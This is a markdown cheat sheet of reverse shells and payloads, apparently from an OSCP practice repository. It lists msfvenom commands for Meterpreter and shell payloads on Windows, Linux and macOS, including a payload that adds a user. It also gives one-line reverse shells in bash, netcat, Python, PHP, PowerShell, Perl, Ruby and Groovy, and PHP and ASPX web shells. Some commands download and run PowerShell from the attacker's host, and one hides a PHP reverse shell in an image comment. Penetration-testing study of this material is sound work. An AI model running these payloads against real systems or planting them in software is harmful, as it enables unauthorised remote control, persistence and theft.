# Payloads and reverse shells

[Practice methodology](../Practice-Exam-Methodology.md) · [Reference index](00-Reference-Index.md)

Commands preserved from the original reference. Replace angle-bracket placeholders before running; check your installed tool’s help for version-specific options. See [exam restrictions](../OSCP-Exam-Rules.md) before using Metasploit or Meterpreter.


## Msfvenom

```bash
msfvenom -l payloads                                                                                 # list available payloads
msfvenom -p <PAYLOAD> --list-options                                                                 # list required payload options
msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <COUNT> LHOST=<LHOST> LPORT=<LPORT> -o <OUTPUT>    # encode payload output

# Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o <PAYLOAD>.elf    # Linux x86 Meterpreter reverse shell
msfvenom -p linux/x86/meterpreter/bind_tcp    RHOST=<RHOST> LPORT=<LPORT> -f elf -o <PAYLOAD>.elf    # Linux x86 Meterpreter bind shell
msfvenom -p linux/x64/shell_bind_tcp          RHOST=<RHOST> LPORT=<LPORT> -f elf -o <PAYLOAD>.elf    # Linux x64 bind shell
msfvenom -p linux/x64/shell_reverse_tcp       LHOST=<LHOST> LPORT=<LPORT> -f elf -o <PAYLOAD>.elf    # Linux x64 reverse shell
msfvenom -p linux/x86/shell_reverse_tcp       LHOST=<LHOST> LPORT=<LPORT> -f raw -o <PAYLOAD>.bin    # Linux x86 raw reverse shell payload

# Windows
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <PAYLOAD>.exe                                 # Windows x64 Meterpreter EXE payload
msfvenom -p windows/meterpreter/reverse_tcp     LHOST=<LHOST> LPORT=<LPORT> -f exe -o <PAYLOAD>.exe                                 # Windows Meterpreter reverse shell
msfvenom -p windows/meterpreter/reverse_tcp     LHOST=<LHOST> LPORT=<LPORT> -f msi -o <PAYLOAD>.msi                                 # Windows MSI Meterpreter payload
msfvenom -p windows/meterpreter_reverse_http    LHOST=<LHOST> LPORT=<LPORT> HttpUserAgent="<USER_AGENT>" -f exe -o <PAYLOAD>.exe    # Windows Meterpreter HTTP reverse shell
msfvenom -p windows/meterpreter/bind_tcp        RHOST=<RHOST> LPORT=<LPORT> -f exe -o <PAYLOAD>.exe                                 # Windows Meterpreter bind shell
msfvenom -p windows/shell/reverse_tcp           LHOST=<LHOST> LPORT=<LPORT> -f exe -o <PAYLOAD>.exe                                 # Windows CMD staged reverse shell
msfvenom -p windows/shell_reverse_tcp           LHOST=<LHOST> LPORT=<LPORT> -f exe -o <PAYLOAD>.exe                                 # Windows CMD stageless reverse shell
msfvenom -p windows/shell_reverse_tcp           LHOST=<LHOST> LPORT=<LPORT> -f dll -o <PAYLOAD>.dll                                 # Windows DLL reverse shell payload
msfvenom -p windows/adduser USER=<USERNAME> PASS=<PASSWORD> -f exe -o <PAYLOAD>.exe                                                 # Windows add-user payload

# macOS
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f macho -o <PAYLOAD>.macho    # macOS x86 reverse shell
msfvenom -p osx/x86/shell_bind_tcp    RHOST=<RHOST> LPORT=<LPORT> -f macho -o <PAYLOAD>.macho    # macOS x86 bind shell

# Scripting and web formats
msfvenom -p cmd/unix/reverse_python       LHOST=<LHOST> LPORT=<LPORT> -f raw -o <PAYLOAD>.py       # Python reverse shell
msfvenom -p cmd/unix/reverse_bash         LHOST=<LHOST> LPORT=<LPORT> -f raw -o <PAYLOAD>.sh       # Bash reverse shell
msfvenom -p cmd/unix/reverse_perl         LHOST=<LHOST> LPORT=<LPORT> -f raw -o <PAYLOAD>.pl       # Perl reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f asp -o <PAYLOAD>.asp    # ASP Meterpreter reverse shell
msfvenom -p java/jsp_shell_reverse_tcp    LHOST=<LHOST> LPORT=<LPORT> -f raw -o <PAYLOAD>.jsp      # JSP reverse shell
msfvenom -p java/jsp_shell_reverse_tcp    LHOST=<LHOST> LPORT=<LPORT> -f war -o <PAYLOAD>.war      # WAR reverse shell
msfvenom -p php/meterpreter_reverse_tcp   LHOST=<LHOST> LPORT=<LPORT> -f raw -o <PAYLOAD>.php      # PHP Meterpreter reverse shell
msfvenom -p php/reverse_php               LHOST=<LHOST> LPORT=<LPORT> -f raw -o <PAYLOAD>.php      # PHP reverse shell

# Execution and shellcode formats
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://<LHOST>/<FILE>.ps1')\"" -f python    # Windows exec payload as Python shellcode
msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=<LHOST> LPORT=<LPORT> -f c -e x86/shikata_ga_nai -b "<BAD_CHARS>"                                 # C shellcode with shikata_ga_nai encoder
msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=<LHOST> LPORT=<LPORT> -f c -e x86/fnstenv_mov -b "<BAD_CHARS>"                                    # C shellcode with fnstenv_mov encoder
```

## Bash

```bash
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1              # bash TCP reverse shell
bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'    # bash reverse shell through bash -c
```

## Netcat

```bash
nc -e /bin/sh <LHOST> <LPORT>                                                                   # netcat reverse shell with -e
mkfifo /tmp/shell; nc <LHOST> <LPORT> 0</tmp/shell | /bin/sh >/tmp/shell 2>&1; rm /tmp/shell    # netcat reverse shell without -e
```

## Python

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'    # Python reverse shell
```

## PHP

```bash
php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'    # PHP reverse shell
```

## PowerShell

```powershell
$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()    # interactive PowerShell reverse shell

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"    # launch PowerShell reverse shell
```

## Perl

```bash
perl -e 'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'    # Perl reverse shell
```

## Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'    # Ruby reverse shell
```

## Web Shells (PHP)

```php
<?php system($_GET['cmd']); ?>
<?php echo exec($_POST['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>
```

## ASPX Web Shell

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions><remove fileExtension=".config" /></fileExtensions>
            <hiddenSegments><remove segment="web.config" /></hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%
Set s = CreateObject("WScript.Shell")
Set cmd = s.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://<LHOST>/shell.ps1')")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

## Exiftool (PHP in Image)

```bash
exiftool -Comment='<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"); ?>' shell.jpg    # embed PHP payload in image comment
```

## Groovy (Jenkins)

```groovy
String host="<LHOST>";int port=<LPORT>;String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
